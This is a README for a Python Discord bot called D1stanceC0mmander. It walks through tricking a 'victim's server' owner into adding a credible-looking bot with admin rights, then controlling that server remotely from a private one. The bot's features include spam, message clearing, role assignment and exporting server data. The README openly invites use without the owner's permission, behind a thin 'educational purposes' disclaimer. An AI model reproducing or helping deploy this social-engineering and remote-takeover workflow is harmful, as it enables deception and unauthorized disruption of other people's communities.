# D1stanceC0mmander

![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) [![Git](https://img.shields.io/badge/git-%23F05033.svg?style=for-the-badge&logo=git&logoColor=white)](https://github.com/your-github-repository)

## Introduction

D1stanceC0mmander is a potent tool that empowers users without the required permissions to execute commands through a Discord bot on an alternative server.

## DISCLAIMER

I am not responsible for any damage or disrespect caused to others or their servers. I am solely creating scripts for other people. This is for educational purposes only.

## Table of content

1. [Introduction](#introduction)
   - [Disclaimer](#disclaimer)
   - [Setup Instructions](#setup-instructions)
     - [Create a Discord Server](#create-a-discord-server)
     - [Install Python](#install-python)
     - [Create the Bot](#create-the-bot)
     - [Clone the Project Locally](#clone-the-project-locally)
   - [Configuration](#configuration)
2. [More Advanced Explanation](#more-advanced-explanation)
3. [Features](#features)
4. [Contribution](#contribution)
5. [License](#license)
6. [Made by P1NGU!](#made-by-p1ngu)

## If you are familiar with Discord bots

You can `git clone https://github.com/independent-coder/D1stanceC0mmander.git`, install requirements, modify the `.env` file, and put your bot token and other [configurations](#configuration).

# Setup instructions

In this section we will put our setup for the D1stance C0mmander bot.

## Create a Discord Server

Create a server where there's no one. It will be our control center.

## Install Python

1. Go to [Python - Downloads](https://python.org/downloads/) then download the latest version.
2. Open the installer and tick the `Add python.exe to PATH`, then click install and let it do its thing.
3. Finally, open `cmd` then type `python - version` and now it should display `Python "VERSION"`.

## Create the Bot

1. To create the bot and get its token, go to [Discord Developer Portal](https://discord.com/developers/applications).
2. Create a new application, then name it to be credible for others to add it more easily and finally accept Discord Developer terms.
3. Personalize the bot (Add a profile picture or a description).
4. Go into the bot section, click Reset token, then it will display the bot token. Note it somewhere; we will need it after.
5. Still in the bot section, scroll down a little bit then in Privileged Gateway Intents activate all three (PRESENCE INTENT, SERVER MEMBERS INTENT, MESSAGE CONTENT INTENT).
6. Finally, go into the OAuth2 tab, scroll at the bottom, and you will see OAuth2 URL Generator. Select bot, then select the permission the bot will have; I will choose admin for simplicity.
7. Copy the GENERATED URL, add it to your server, and send the URL to the owner of the victim's server.

And there you go! You've created your bot and added it to your server and the victim's server.

## Clone the project locally

1. Ensure you have [Git](https://git-scm.com/download/) installed correctly.
2. Open `cmd`, Navigate to a directory where you will have D1stanceC0mmander installed.
3. Clone the repository: `git clone https://github.com/independent-coder/D1stanceC0mmander.git`.
4. Navigate to the project `cd D1stanceC0mmander`.
5. Install the required dependencies: `pip install -r requirements.txt`.
6. Create a `.env` file and add your Discord bot token and other [configurations](#configuration).
7. Run the bot: `python D1stanceC0mmander.py`.

Feel free to explore and contribute to make D1stanceC0mmander even more powerful!

## Configuration

Make sure to set up your `.env` file with the following configurations:

```dotenv
TOKEN=your_discord_bot_token
ALLOWED_SERVER_ID=your_allowed_server_id
```

Token means the token of the [bot](#create-the-bot).
Allowed Server ID means the [control server](#create-a-discord-server).

## More Advanced Explanation

This bot and Python work using Discord's API to run on Python. To make this work, you will need to create a server with you and your bot, then make the owner of another server add the bot with the necessary permissions (Admin). Then, from your very own server, you can simply execute commands on other servers! (With their permission.)
(You can still try it without their permission 😉)

## Features

- **Spam Command:** Spam a message in a server channel with customizable parameters.
- **User Info Command:** Display detailed information about a user.
- **Assign Role Command:** Assign a role to a member in a specified server.
- **Clear Command:** Clear a specified number of messages in a channel.
- **Joined Server Command:** Display detailed information about each server the bot is in.
- **Export Servers Command:** Export information about joined servers to a text file.
- **Display Commands Command:** Display available commands in an embed and remove other commands.

## Contribution

If you have good knowledge in Python and Discord bot API, you can contribute and contact me on Discord, and we will talk about it.
My name is pingui_8163.

## License

This project is licensed under the MIT License - see the [LICENSE.txt](https://github.com/independent-coder/D1stanceC0mmander/blob/main/LICENSE.txt) file for details

## Made by P1NGU!(independent-coder)

In Python using [Discord.py](https://discordpy.readthedocs.io/en/stable/) and Pycharm.
